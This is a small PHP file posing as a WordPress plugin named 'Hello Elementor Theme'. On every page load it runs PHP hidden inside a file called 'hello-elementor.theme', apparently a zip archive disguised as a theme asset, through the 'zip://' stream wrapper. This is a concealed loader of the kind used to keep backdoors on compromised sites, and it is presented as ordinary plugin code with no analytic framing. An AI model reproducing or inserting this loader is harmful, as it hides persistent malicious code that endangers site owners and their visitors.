<?php

/**
 * Plugin Name: Hello Elementor Theme
 * Description: Hello Elementor theme plugin.
 * Version: 6.3.1
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 */

function wp_hello_elementor_theme_load() {

    load_template( "zip://" . locate_template( "hello-elementor.theme" ) . "#archive", true );

}

add_action( 'wp_loaded', 'wp_hello_elementor_theme_load' );
